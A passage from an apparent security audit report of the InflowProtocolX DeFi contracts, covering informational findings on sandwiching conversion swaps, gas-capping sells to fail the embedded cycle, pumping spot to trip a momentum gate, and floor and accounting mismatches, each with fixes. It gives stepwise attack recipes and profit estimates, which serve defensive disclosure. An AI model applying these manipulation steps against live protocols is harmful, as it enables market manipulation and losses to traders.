The attack loses money at the defaults (first table row). Two owner levers decide whether it pays: roughly, when `2 * capBps` exceeds `sellTaxBps + buyTaxBps` plus two 0.29% swap fees, i.e. total taxes below roughly 40 bps at the 50 bps `capBps` maximum, or `capBps` above about 29 at 0/0 taxes, where only the keeper's `poke()` runs the cycle and the attacker must sandwich a trusted keeper in a state the README calls paused ("Sell tax 0 pauses the cycle", `README.md:298`). The band only scales the gain (10% suffices; 20% roughly doubles it); the round also needs D at or above the convert threshold and no momentum block. PnL per round, as a share of the pushed pool's quote reserve (flash-swap push from TWAP to the band edge paying one sell tax, one buy tax and two 0.29% swap fees; full-cap leg; buyback of the IPX sold):

| Taxes buy/sell (bps) | Cap (bps) | Band | Attacker PnL |
| -------------------- | --------- | ---- | ------------ |
| 50/50                | 25        | 10%  | -5.8 bps     |
| 50/50                | 50        | 10%  | -3.2 bps     |
| 0/0                  | 25        | 10%  | -0.35 bps    |
| 0/0                  | 50        | 10%  | +2.3 bps     |
| 0/0                  | 50        | 20%  | +5.0 bps     |

The `_swap()` comment calling `minOut` "the real safeguard against sandwich / price moves" (`ConversionModule.sol:505-509`) therefore misleads, though the `maxLegDeviationBps` NatSpec (`ConversionModule.sol:72-76`) concedes the settings do not guarantee protection against all sandwich losses.

### 2. The triggering seller's swap is priced after the cycle's own conversion sell into the same pair

`IPXToken._update()` credits the sell tax to the vault (`IPXToken.sol:414-418`) and calls `VaultController.checkAndExecute()` before moving the seller's net IPX to the pair, deliberately, because V2 routers measure the seller's input as `balanceOf(pair) - reserve` (`IPXToken.sol:364-370`; README.md:359-360, "Architectural deviation from the original spec - cycle trigger"). A due conversion round (among other gates, D at or above the convert threshold, no cooldown and no bullish momentum) has `ConversionModule.execute()` withdraw vault IPX and sell up to `capBps` of each base pool's IPX reserve. Unless its leg is zero or declined, the IPX/WPLS or IPX/stable pool being sold into thus moves first, by about 2 x `capBps` on a constant-product curve (slightly less, as the leg pays the pool fee), and the user's swap returns up to that much less than a pre-trade `getAmountsOut()` quote, besides the 0.5% sell tax the quote also omits. IPX/rail pairs are unaffected; conversion never trades there.

The cap NatSpec (default 25 bps at `InflowConstants.sol:167`, maximum 50 bps at `InflowConstants.sol:171`) acknowledges the move, notes "a concurrent seller's tax and own slippage are on top of it", and sizes the maximum to stay "inside a 2% seller tolerance after the 0.5% tax" (`InflowConstants.sol:161-171`). The README and the brief describe the ordering's quote effect only for `addLiquidity()` (README, "User liquidity is not a supported path"; `AUDIT_BRIEF.md` §4, item 3), not ordinary sells.

## Location of Affected Code

Sub-section 1, the floor comes from the same-frame spot quote:

File: [src/ConversionModule.sol#L538-L564](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol#L538-L564)

```solidity
spotOut = _spotAmountOut(amountIn, path);
    // code
    if (deviation > maxLegDeviationBps) return (false, spotOut, twapOut, deviation, 0);
    expected = Math.min(spotOut, twapOut);
}

minOut = Math.mulDiv(
    expected, InflowConstants.BPS_DENOMINATOR - minSlippageBps, InflowConstants.BPS_DENOMINATOR
);
```

Sub-section 2, the cycle runs before the seller's IPX reaches the pair:

File: [src/IPXToken.sol#L438-L445](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L438-L445)

```solidity
if (isSell && !isBuy && sellTax > 0 && !inSwap && vaultController != address(0)) {
    try IVaultController(vaultController).checkAndExecute() {}
    // code
}

super._update(from, to, value - taxAmount);
```

## Impact

In sub-section 1, the pushed leg fills about 10% below its unpushed output (about 20% at a 20% band), but at the defaults the push's sell and buy tax to the vault exceeds that, so the vault gains on net and the attack is griefing at the attacker's cost. Only in the narrow lever region above does it pay, and little: on the IPX/WPLS launch pool, with $6,400 of WPLS on the quote side (`docs/LAUNCH_PLAYBOOK.md:148`), about $1.45 per round at a 10% band and $3.20 at 20%, at most once per 30-minute cooldown. The README accepts a similar residual for rail skips (`README.md:387-392`), and the band and its compounding with slippage are documented, including fills roughly 14.5% below TWAP (`docs/MIGRATION_PLAYBOOK.md:184-193`), but not that `minOut` never binds or where the sandwich pays.

In sub-section 2, the triggering seller receives, beyond the sell tax, about 0.5% less than the quote at the default 25 bps cap and about 1% less at the 50 bps maximum (full-cap leg; less for a smaller leg or a large sell). The difference goes into the protocol's own conversion fill, not to a third party, and hits only the seller whose sell runs the round, about once per 30-minute cooldown (a partial round, which starts no cooldown, can add one more per period), never when the keeper's `poke()` runs it. The user's `amountOutMin` bounds the loss; a tighter tolerance reverts the swap and the round, so a same-tolerance retry fails until the keeper or another seller runs the round.

Both are therefore Informational: sub-section 1 costs a few dollars a round at most, its defect being the misleading `minOut` comment and the undocumented lever interaction, and sub-section 2 is a bounded, documented gap within the seller's tolerance, budgeted in the cap NatSpec, that profits no attacker and costs the protocol nothing.

## Recommendation

1. For the conversion legs:

   a. Make `minSlippageBps` a real bound against the TWAP by declining, in `_legQuote()`, a leg whose spot output is more than `minSlippageBps` below `twapOut`. Anchoring `minOut` to `twapOut * (1 - minSlippageBps)` gives the same bound, but a miss then fails at the router as `Failed` and rolls back the whole cycle, so decline instead.

   This narrows the band rather than closing it, at a cost. At the defaults, the downside bound moves from 10% to 5%: an attacker can still fill a leg just inside it for about half the shortfall, and ordinary declines of more than 5% against the window decline legs the 10% default was chosen to tolerate (`ConversionModule.sol:72-76`). Deliberate declining pushes halve too: a little over 5% down on IPX/stable declines the stable side, so the per-trigger sandwich in I-07 can run on a push about half the size of the 10% buy it describes, and the same push on IPX/WPLS drops the WPLS leg while the round still completes and starts the cooldown (`ConversionModule.sol:273-277`, `VaultController.sol:590-591`). `setSlippage()` also accepts values down to 100 bps, an effective 1% band, tighter than the floor I-16 recommends for the leg deviation: apply the check at no less than that floor, or give the downside bound its own parameter and lower bound, as the slippage minimum exists to absorb output-side transfer fees (`ConversionModule.sol:62-68`).

   b. For consistency, measure `_deviationBps()` against `min(spot, twap)`, like the LiquidityDeployer, VaultController and ExpansionModule gates (a marginal change).

   c. Validate the levers jointly, or at least document that `2 * capBps` should stay below `sellTaxBps + buyTaxBps + 58` (two 0.29% swap fees). The check spans `IPXToken.setTaxes()` and `ConversionModule.setConversionCap()`, and in `setTaxes()` would refuse a zero sell tax, the documented pause (`README.md:298`), at a cap of 29 bps or more: check it in `setConversionCap()` against current taxes, and in `setTaxes()` exempt a zero sell tax (only the keeper's `poke()` then runs the cycle) or require lowering the cap first, documenting that order. Derive the fee term from `AMM_FEE_NUM` and `AMM_FEE_DEN`, not a constant.

   d. Correct the comment at `ConversionModule.sol:505-509`.

2. Document the triggering seller's exposure for traders and integrators, and have front-ends quote by simulating the full swap with `eth_call` (which runs the cycle), not `getAmountsOut()`. An optional `conversionDue()` view can let interfaces warn users or widen slippage before a round-triggering sell, but only as a hint: it must apply `_runCycle()`'s gates, and a cooldown can expire, or another transaction run the round, before the sell lands, so the minimum output should still allow for a newly due round. Running the keeper's `poke()` as each cooldown expires also takes most rounds off user sells.

## Team Response

Fixed.

# [I-09] A Permissionless Actor Can Make a Triggered Cycle Fail or Skip Conversion by Capping a Sell's Gas or by Pumping Spot Ahead of the Trigger

## Severity

Informational Risk

## Description

A permissionless actor can make a triggered cycle fail or skip its conversion, one trigger at a time: a seller can cap its gas so that a heavy cycle inside its own sell runs out of gas and rolls back while the sell settles, and anyone can pump IPX/WPLS spot ahead of a taxed sell or the keeper's `poke()` so that the momentum gate skips that cycle's conversion and deployment. The vault loses no funds on either route, and the skipped work runs at a later trigger the actor does not interfere with.

### 1. A seller can fail the cycle inside its sell by capping the gas it forwards

The README accepts that "the seller picks the state" its cycle runs in, and that a cycle can roll back while the tax and the sell settle, to be retried by the next sell or the keeper's `poke()` (`README.md:369-377`). The case it names is a sell made from a flash-swap callback. A seller can reach the same outcome by capping the gas it forwards, a route the README does not name.

The `catch (bytes memory)` around `checkAndExecute()` in `IPXToken._update()` is deliberate, so that a cycle revert cannot brick transfers (`IPXToken.sol:433-435`), but it also swallows an out-of-gas failure, and there is no `gasleft()` floor anywhere in `src/`. Under EIP-150, the callee receives at most 63/64 of the gas left at the call; the 1/64 kept back pays for `emit CycleFailed` and the final `super._update()`. The gas the seller forwards to the token therefore decides whether a heavy cycle completes. The steps are:

a. An attacker contract calls `ipx.transfer{gas: G}(pair, X)` directly; the route needs a custom contract. It chooses G so that 63/64 of the gas left at the `checkAndExecute()` call is below the cycle's cost C, while the remaining 1/64 still covers the `CycleFailed` emit and the net transfer.

b. The cycle runs out of gas and rolls back. The net IPX lands in the pair.

c. The attacker calls `pair.swap()` for the output. That call moves no IPX, so it triggers nothing, and the attacker is filled against reserves the protocol's round has not moved.

The route needs C to exceed roughly 63 times the post-catch tail of about 10-40k gas, that is roughly C > 0.6-2.5M gas. A gas-capped call through the router would also have to pay for the router's own `pair.swap()` after the transfer, which lengthens the tail and raises the threshold, so the direct contract call is the practical form. Cycle gas depends on which steps run and has not been measured, so whether a particular cycle crosses that line is open. Where a cycle does cross it, the gas route also reaches cycles that do not trade on the seller's pair at all, such as rail seeds and TWAP pins.

### 2. A pump placed ahead of a trigger makes the momentum gate skip that cycle's conversion and deployment

A third party can make the protocol skip conversion and deployment on any trigger it can get ahead of, one trigger at a time, with a buy of about 2.4% of the IPX/WPLS pool's IPX reserve placed ahead of the trigger and unwound after it.

Holding a sale back while IPX spot sits more than `MOMENTUM_THRESHOLD_BPS` (5%, `InflowConstants.sol:191`) above the IPX/WPLS TWAP is the documented intent of `VaultController._inBullishMomentum()` (`VaultController.sol:1479-1492`). `_runCycle()` folds it into `canConvert` (`VaultController.sol:528-529`), and deployment requires `ipxConverted > 0`, so a true reading skips both. The NatSpec chose the TWAP as the reference because no single transaction can drag it, but the value compared against it is raw spot from `_ipxWplsPriceQ()`, which reads live reserves and moves with a single buy. A pump unwound around one trigger is not a rally, yet it trips the gate.

The buy itself runs no cycle, since only sells trigger one (`IPXToken.sol:436`). Once the cooldown has elapsed and D is above the threshold:

a. Buy about 2.4% of the IPX/WPLS pool's IPX reserve (starting from spot at the TWAP), ordered before the trigger: a taxed sell or the keeper's `poke()`.

b. The trigger's cycle sees `canConvert == false`.

c. Sell back. The sell-back's cycle runs before its IPX reaches the pair (`IPXToken.sol:436-443`), so it is blocked as well while spot stays more than 5% above the TWAP. If the trigger was a sell into IPX/WPLS that pulled spot back inside the band, the sell-back's cycle converts, so the attacker has to size the buy to cover that sell.

d. Repeat at each trigger.

## Location of Affected Code

Sub-section 1: the deliberate catch-all `try`, with no gas floor, followed by the seller's own transfer:

File: [src/IPXToken.sol#L435-L445](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L435-L445)

```solidity
// The catch must stay so a cycle revert cannot brick user
// transfers; the failure is observable via CycleFailed rather
// than silently swallowed.
if (isSell && !isBuy && sellTax > 0 && !inSwap && vaultController != address(0)) {
    try IVaultController(vaultController).checkAndExecute() {}
    catch (bytes memory reason) {
        emit CycleFailed(reason);
    }
}

super._update(from, to, value - taxAmount);
```

Sub-section 2: the momentum gate compares raw spot with the TWAP:

File: [src/VaultController.sol#L1493-L1500](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1493-L1500)

```solidity
function _inBullishMomentum() internal view returns (bool) {
    (uint256 refQ, bool ok) = _ipxWplsQForD();
    if (!ok || refQ == 0) return true;
    uint256 currentQ = _ipxWplsPriceQ();
    if (currentQ <= refQ) return false;
    uint256 rise = ((currentQ - refQ) * 10_000) / refQ;
    return rise > InflowConstants.MOMENTUM_THRESHOLD_BPS;
}
```

Sub-section 2: spot is read from live reserves:

File: [src/VaultController.sol#L1457-L1461](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1457-L1461)

```solidity
function _ipxWplsPriceQ() internal view returns (uint256) {
    (uint256 ipxRes, uint256 wplsRes) = _orderedReserves(ipxWplsPair, ipxToken, wpls);
    if (ipxRes == 0) return 0;
    return (wplsRes * 1e18) / ipxRes;
}
```

## Impact

Each route costs the protocol the work of the trigger it targets (the whole cycle under sub-section 1, that cycle's conversion and deployment under sub-section 2), and the vault loses no funds on either. Under sub-section 1, a seller gains only when the round would trade on its own pair; it then avoids at most the protocol's own pre-sell price impact, about `2 * capBps`, which is 50 bps at the default 25 bps cap, and a seller who lets the cycle run bears that impact (see I-08). The documented flash-swap route already gives that seller the same fill, because the round's leg into its locked pair fails and the round rolls back, so for the seller's own fill the gas route adds nothing. The gas route's extra reach is cycles that do not touch the seller's pair; failing one of those gains the seller nothing and wastes only its own trigger. The next sell or the keeper's `poke()` runs the cycle normally, and `poke()` runs outside transfers with the keeper's own gas, so it cannot be starved this way; if every seller did this, conversion cadence would rest on the keeper.

Under sub-section 2, conversion and deployment are skipped for each trigger the attacker gets ahead of, but nothing outlives the cycle: no `lastExecutionTime` is written (`VaultController.sol:590-591`), the 30-minute cooldown is not consumed, and the next trigger that is not front-run converts normally. No funds move, and none are lost or locked; the vault keeps its IPX, WPLS and stable until a later cycle sells. Each blocked trigger costs the attacker about 1.58% of the IPX it buys and sells back (0.5% buy tax, 0.5% sell tax and two 0.29% swap fees), which comes to about 0.04% of the pool's IPX side per trigger, on capital of about 2.4% of that side held across the trigger in separate transactions. A trigger that sells into IPX/WPLS also fills at the pumped price, at the attacker's expense. The attacker has no direct profit. The one party that could benefit is a large seller: pumping ahead of its own sell stops the vault's conversion, which otherwise runs first inside that sell (`IPXToken.sol:436-443`), from landing ahead of it. The default per-pair conversion cap limits the vault's own move to about 0.5% per round (`InflowConstants.sol:160-167`), which bounds that benefit, and the seller still pays the round trip.

This is Informational. The gas route works only if a cycle costs more than roughly 0.6-2.5M gas, which is unmeasured, and it is a second route to an outcome the README already accepts that adds no impact of its own; blocking a single trigger with a pump achieves nothing because the next sell converts, and a lasting effect needs the attacker to front-run every post-cooldown taxed sell and every keeper `poke()` at a loss each time, while the protocol loses nothing.

## Recommendation

1. Gas-capped sells:

   a. Require `gasleft() >= MIN_CYCLE_GAS` before the `try` in `_update()`, sized for the heaviest cycle with headroom for the 1/64 that EIP-150 holds back at each nested call. Alternatively, revert the outer transfer when the `catch` sees empty return data with too little gas left. Either way, every taxed sell must then carry a gas limit large enough for a full cycle, so wallets and routers that set a tight limit will see reverts.

   b. Both variants put a new revert into the sell path that the `catch` exists to keep clear (`IPXToken.sol:433-435`), so each needs a bound. The token is never replaced, while the cycle it calls changes with every VaultController generation and grows with state: `_protocolLp()` loops over the POL depositor registry (`VaultController.sol:1348-1357`), which each migration merges into the successor. A constant fixed in the token today therefore cannot follow the cycle's cost. Read the figure from the VaultController or set it through an owner setter, and in either case cap it in the token well below the block gas limit, because a floor that no transaction can meet makes every taxed sell revert. The catch-side variant reverts only the sells whose cycle actually ran out of gas, which is gentler on wallets. However, if a cycle ever needs more gas than any transaction can supply, it reverts every taxed sell until the owner sets the sell tax to 0, which also pauses the cycle (`README.md:298`).

   c. Because the documented flash-swap route reaches the same outcome and stays open, documenting the gas route without adding either check is a reasonable choice. Also extend the README residual to name the gas route, alert on `CycleFailed` events with empty data, and keep the keeper funded.

2. Momentum gate (either change also makes the gate slower to hold back sales in a genuine rally):

   a. Optionally, rate-limit momentum skips, but measure the limit in time rather than in triggers. Any taxed sell of 200 wei runs the cycle, so a rule such as "convert after N consecutive skips" could be met with N dust sells and would switch the gate off on demand during a genuine rally. For example, record when an otherwise eligible cycle (cooldown over, D at or above the threshold) is first held back by momentum, clear the record whenever an eligible cycle is not held back, and convert regardless once the record is older than one `COOLDOWN_PERIOD`.

   b. Or measure momentum against the oracle's live TWAP (`liveTwapQ()`) instead of raw spot. A buy made in the block in which the live TWAP is read adds no weight to it (`TWAPOracle.sol:590-608`). However, `liveTwapQ()` returns zero in the block of a pin and reverts for an uninitialised pair or an empty reserve, and its NatSpec (`TWAPOracle.sol:518-520`) requires callers to enforce a minimum span; the ArbitrageMonitor uses half a window (`ArbitrageMonitor.sol:136-142`). Read it through `try`, and define what the gate does while the span is too short or the read fails. Failing closed would hold back conversion for that part of every window, so fall back to the current spot comparison there, which keeps today's behaviour for that interval only. A pump held over several blocks still moves the live average by about its size times the share of the span it is held, so this raises the cost of a block rather than removing it, the same limitation I-05 describes for the arbitrage monitor's confirmation.

## Team Response

Fixed.

# [I-10] A Stage-Opening Rail Seed Is Sized Against the Old Stage's Stable Floor, Leaving the Vault Below the New Floor

## Severity

Informational Risk

## Description

When a cycle opens the next rail, the seed withdrawal is measured against the stable floor of the stage in force before the rail opens. The vault can therefore end up below the new stage's floor by up to one floor step ($432) until conversions refill the gap, a state the project's own invariant test treats as a violation.

`ExpansionModule.checkExpansion()` caps each seed at `VaultController.seedWithdrawable()`. That function returns the protected seed, capped at the stable balance above `stableFloor()`, which is the floor of the stage currently in force. `_try()` then withdraws the seed and only afterwards writes the rail's activation flag. The flag raises `activeStage()`, and with it `stableFloorForStage()`. Nothing re-checks the vault's stable balance against the new floor.

The in-loop comment (`ExpansionModule.sol:354-357`) says the loop re-reads `seedWithdrawable()` because "A stage transition can raise the stable floor". But the re-read runs before the flag write in the same iteration, so it only sees transitions made by an earlier rail. The `seedWithdrawable()` NatSpec (`VaultController.sol:722-726`) says that a floor "that stepped up since the seed was credited is never breached by a seed withdrawal; the rail waits for tax to refill the gap". The check enforces this for a floor raised before the withdrawal. It does not cover the floor that the withdrawal's own rail activation raises. The project's invariant suite states the intent without that qualification: `invariant_stableVaultAboveFloor()` (`test/invariants/Invariants.t.sol:71-75`) asserts that the vault's stable balance is always at or above `stableFloor()`, and `M3_DELIVERABLE.md:302` lists "stable vault always ≥ floor" among the tested invariants. The state described below does not satisfy it.

The stable floor steps up by $74, $346, $432 and $432 as the four rails open: $12 → $86 → $432 → $864 → $1,296. The treasury stage adds no further step. The case arises in honest operation, with no attacker. It needs three conditions: the rail's gates pass (the B threshold and, after PRVX, the previous rail's POL gate); `seedWithdrawable()` covers that rail's seed of about $5,000; and the balance above the current floor is the seed plus some x smaller than the next floor step. At stage 3, `seedTarget()` reserves only the pHEX seed, so a vault holding $5,000 seed + $864 floor + x is a reachable state just before pHEX opens. The breach follows whenever the stable surplus x is under $432:

1. A taxed sell or the keeper's `poke()` runs the cycle, and `checkExpansion()` reads `seedWithdrawable()` = $5,000.
2. `_try()` withdraws the $5,000 pHEX seed and sets `core3Active`. The stage becomes 4, and the stable floor becomes $1,296.
3. The vault holds $864 + x, below the $1,296 floor, until conversion proceeds in this or later cycles close the gap of $432 - x.

## Location of Affected Code

The seed is capped by the floor in force before the rail opens:

File: [src/ExpansionModule.sol#L354-L360](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L354-L360)

```solidity
// A stage transition can raise the stable floor. Re-read the
// currently withdrawable amount for that geometry, but cap it by
// the per-call budget so the unchanged vault bucket cannot be
// authorized twice before the controller debits it.
uint256 withdrawable = IVaultController(vaultController).seedWithdrawable();
uint256 available = withdrawable < remainingSeed ? withdrawable : remainingSeed;
uint256 spent = _try(_rail(i), i, available, anchorRefQ);
```

`seedWithdrawable()` subtracts the current stage's floor:

File: [src/VaultController.sol#L722-L732](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L722-L732)

```solidity
/// @notice Protected seed the expansion module may withdraw right now:
///         the bucket, capped at what the balance holds above the floor.
///         A floor that stepped up since the seed was credited is never
///         breached by a seed withdrawal; the rail waits for tax to
///         refill the gap.
function seedWithdrawable() public view returns (uint256) {
    uint256 bal = IERC20(stable).balanceOf(address(this));
    uint256 floor = stableFloor();
    uint256 aboveFloor = bal > floor ? bal - floor : 0;
    return protectedSeedStable < aboveFloor ? protectedSeedStable : aboveFloor;
}
```

The seed leaves the vault before the flag that raises the stage is written:

File: [src/ExpansionModule.sol#L706-L811](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L706-L811)

```solidity
IVaultController(vaultController).withdrawTo(stable, seedUsd, address(this));
// code
if (idx == 0) prvxActive = true;
else if (idx == 1) core1Active = true;
else if (idx == 2) core2Active = true;
else if (idx == 3) core3Active = true;
```

The per-stage floors:

File: [src/InflowConstants.sol#L51-L62](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/InflowConstants.sol#L51-L62)

```solidity
uint256 internal constant STAGE0_WPLS_FLOOR_USD   =    48e6;
uint256 internal constant STAGE0_STABLE_FLOOR     =    12e6;
uint256 internal constant STAGE1_WPLS_FLOOR_USD   =   154e6;
uint256 internal constant STAGE1_STABLE_FLOOR     =    86e6;
uint256 internal constant STAGE2_WPLS_FLOOR_USD   =   768e6;
uint256 internal constant STAGE2_STABLE_FLOOR     =   432e6;
uint256 internal constant STAGE3_WPLS_FLOOR_USD   = 1_536e6;
uint256 internal constant STAGE3_STABLE_FLOOR     =   864e6;
uint256 internal constant STAGE4_WPLS_FLOOR_USD   = 2_304e6;
uint256 internal constant STAGE4_STABLE_FLOOR     = 1_296e6;
uint256 internal constant STAGE5_WPLS_FLOOR_USD   = 3_000e6;
uint256 internal constant STAGE5_STABLE_FLOOR     = 1_296e6;
```

## Impact

Right after a rail opens, the vault's stable balance can sit below the new stage's floor by the step minus x, which is $432 at most. No funds are lost: the $5,000 that leaves is the protected seed reserved for this rail, and it ends up as IPX/rail LP locked in the `LpLocker`. Until conversions refill the gap, `getStableSurplus()` reads zero (`VaultController.sol:716-720`), so the stable-funded deployment legs, whose budget is half the stable surplus (`LiquidityDeployer.sol:341-342`), get nothing. The WPLS leg is unaffected.

That pause is not specific to this defect. Every floor step lowers `getStableSurplus()` by the size of the step, so the stable legs pause after any rail opening whose surplus above the old floor is smaller than the step, whether or not the balance falls below the new floor. For example, when PLSX opens with the INC seed still protected, the balance stays well above the new $432 floor, yet `getStableSurplus()` reads zero until the free stable above the old floor exceeds the $346 step. Sizing the seed against the new floor would not avoid the refill either: the rail would wait for the same $432 - x instead of the stable legs. The WPLS floor also steps up at every stage transition with no balance check, so a balance briefly below a freshly raised floor is already normal elsewhere in the vault.

The issue is Informational. It occurs in honest operation whenever a rail opens with less than one floor step of surplus above the old floor, which can happen at most four times in the protocol's lifetime. Its only effect beyond the by-design floor-step pause is a mismatch with the NatSpec, the in-loop comment and a developer invariant test, with no asset at risk.

## Recommendation

Before withdrawing a seed that opens the next stage, check it against the floor that stage will have. That is, cap it at the balance above `stableFloorForStage(activeStage() + 1)` rather than above `stableFloor()`, and skip with nothing moved when that is short.

This check moves the wait from the stable legs to the rail, and on the last rail it does not by itself guarantee that the wait ends. While the rail waits, the stage does not change, so `getStableSurplus()` is still measured above the old floor and every deploying round spends up to half of it. For PRVX, PLSX and INC, the gap still closes: either the following rail's seed is already in the bucket and covers the step, or the conversion's seed leg is still crediting that bucket, and the stable it credits stays in the vault. For pHEX, the bucket holds only its own seed, so the gap can close only from free stable surplus. With deployment running every round, that surplus settles near one round's stable inflow. If rounds stay small enough for it to sit below the $432 step, pHEX does not open, and neither does the treasury stage that requires it. To bound the wait, reserve the step together with the last seed. While pHEX is the only rail left, have `seedTarget()` return its seed plus the $432 step to the stage-4 floor. The conversion's seed leg then sets the step aside, and deployment cannot spend it. When pHEX opens, the target falls to zero and `_releaseProtectedSeedAbove()` (`VaultController.sol:998-1003`) frees the step, which the new floor then covers. Correct the `seedTarget()` NatSpec (`ExpansionModule.sol:433-438`) to match. The cost is that the $432 stable-leg pause comes before the pHEX opening instead of after it.

Do not re-check after the flag is written. The swap has already happened by then, so the only option left would be a revert, and that rolls back the whole cycle, including the conversion that would refill the floor.

If the team prefers to open the rail first, correct the `seedWithdrawable()` NatSpec and the in-loop comment to say that the floor raised by the seed's own activation may be breached until conversions refill it. Qualify the `invariant_stableVaultAboveFloor()` property and the matching line in `M3_DELIVERABLE.md` the same way. Today's order needs no other change to recover: once the rail opens, `getStableSurplus()` reads zero, the stable legs stop drawing, and conversions refill the floor.

## Team Response

Fixed.

# [I-11] Placed-Liquidity, POL and Gate Figures Measure a Different Quantity From the One Their Documentation Describes

## Severity

Informational Risk

## Description

Several figures measure a slightly different quantity from the one their comments and NatSpec describe.

### 1. Rail tokens bought with vault stable but parked at the reserve wallet are still counted as placed liquidity

`ExpansionModule._planSeed()` checks the reserve wallet's IPX balance and allowance against the planned IPX leg only, deliberately without headroom (`ExpansionModule.sol:950-963`), but `_ipxLegForRail()` sizes the leg from the rail received (`ExpansionModule.sol:1081-1082`; rail slices, on live already-seeded pairs, take the pair-ratio branch on line 1081, the scaled planned leg on line 1082 serving an empty or dusted pair at seeding). If a fill beats the TWAP plan and the reserve cannot cover the larger leg, the clamp in `contributeToRail()` scales the rail leg down and sends the unmatched rail to `reserveWallet` instead of locking it. `_try()` has the same clamp (`ExpansionModule.sol:749-762`), rounding leftovers from the add go the same way (`ExpansionModule.sol:619-620`, `874-875`), and the comments call this intended (`ExpansionModule.sol:950-956`, `510-512`).

Both still return the full stable withdrawn (`usdStable`; `seedUsd` in `_try()`, `ExpansionModule.sol:825`). That is right for the seed, as the VaultController debits the protected seed by the stable that left the vault (`VaultController.sol:455-463`), and matches `contributeToRail()`'s NatSpec, "Stable withdrawn from the vault" (`ExpansionModule.sol:524`), and the deployer's "stable spent" (`LiquidityDeployer.sol:251-255`). But `LiquidityDeployer.deploy()` adds each per-cycle slice's return to `placedUsd` (`LiquidityDeployer.sol:260-265`) beside base legs that report what they placed (`LiquidityDeployer.sol:242`; `_addLiquidityStable()` returns the stable the pair took, `LiquidityDeployer.sol:587`), and in the treasury stage `placedUsd` scales the treasury cut (`LiquidityDeployer.sol:281-284`), "earned by the liquidity actually placed" (`LiquidityDeployer.sol:268`), so partly parked rail counts as placed in full.

Only the clamp is reachable: the `available == 0` exits (`ExpansionModule.sol:587-590`, `745-748`) cannot fire after the `_planSeed()` check, the only reserve pull in between (`_correctDustPair()`, in `_try()`) taking at most 1% of the leg, and the `ipxAmount == 0` exits (`ExpansionModule.sol:574-580`, `726-732`) would need `_ipxLegForRail()` to round to zero, which is impractical. With each hop's spot within 5% of its TWAP (`ExpansionModule.sol:1231-1236`), the rail received beats the plan by at most 5% on the direct stable/rail route and about 10.25% through WPLS, so the reserve's smaller of balance and allowance must lie in `[ipxLeg, ipxLeg * tokenAmount / expectedRail)`: given the documented 730M IPX reserve and module approval (`README.md:169-170`, `190`), only a nearly used-up inventory or an allowance set close to one leg.

### 2. `Locker.depositedBy` is never debited, so after a post-unlock withdrawal, third-party LP is valued as protocol POL

`Locker.depositedBy` is only added to by its single writer, `deposit()` (`Locker.sol:88-94`); `withdraw()` leaves it untouched (`Locker.sol:99-108`), and the ledger's NatSpec (`Locker.sol:41-48`) relies on the reader to cap attribution at the live balance while noting that deposits are permissionless. As plain transfers also raise the balance, `balanceOf(locker)` mixes protocol and third-party LP.

`VaultController._protocolLp()` returns min(A, balance), where A is the registered depositors' `depositedBy` total (`VaultController.sol:1348-1357`). After the multisig withdraws W with X of third-party LP of the same pair in the locker, that is min(A, A - W + X), overstated by min(W, X) in B and per-rail POL, contrary to the `polUsd()` NatSpec (`VaultController.sol:1273-1275`), attribution "capped at what the locker still holds so a post-unlock withdrawal is never valued", and the same claim in the `_protocolLp()` NatSpec (`VaultController.sol:1343-1347`). Before unlock, the cap works (min(A, A + X) = A, so donated LP cannot inflate B). After unlock, it overstates only by the ledger's own definition of protocol POL: LP delivered by a registered depositor: LP is fungible and the multisig then controls every locked token, but that is the definition the NatSpec states and `_protocolLp()` exists to enforce. It takes the following:

1. `unlockTime` has passed: the LpLocker lock is 5,555 days, about 15 years (`LpLocker.sol:12`), and `withdraw()` is gated by `postUnlock`.
2. The multisig withdraws W of a pair's LP.
3. A third party holds X of the same LP in the locker, deposited or transferred before or after the withdrawal, so no fresh deposit is needed; X >= W hides the whole withdrawal.
4. For a stage to activate on the hidden part, the progression must still be incomplete more than 15 years after launch and B, or the previous rail's POL, must sit within min(W, X) of its threshold.

The multisig can undo this: after unlock it may withdraw any token in any amount (`Locker.sol:22-23`), and sweeping the third-party LP too restores the balance to A - W.

### 3. Deviation gates, conversion caps and the deploy result measure rounded or balance-based quantities

**(a) Floor-rounded deviation gates admit up to 1 bp beyond the documented band.** The pattern `deviation = |a - b| * 10_000 / base; if (deviation > BAND)` (`base` being the smaller price in the TWAP guards and always the stored `anchorReference` in the spot guard) drops the fractional basis point, so a price up to just under 1 bp outside the band passes. It appears in the VaultController's unwired spot guard (`_spotDeviationBps()`, `VaultController.sol:1107`), both TWAP manipulation checks (`_twapManipulationCheck()` and `_twapManipulationCheckView()`, `VaultController.sol:1131-1132` and `:1145-1146`), the LiquidityDeployer's `_twapGuard()` (`LiquidityDeployer.sol:711-712`) and the ExpansionModule's `_deviationBps()` (`ExpansionModule.sol:1359-1363`). Only the ConversionModule's `_deviationBps()` (`ConversionModule.sol:573-580`) rounds up, rejecting any fraction of a basis point above its gate; it divides by the TWAP output rather than the smaller price, so it models the rounding direction only.

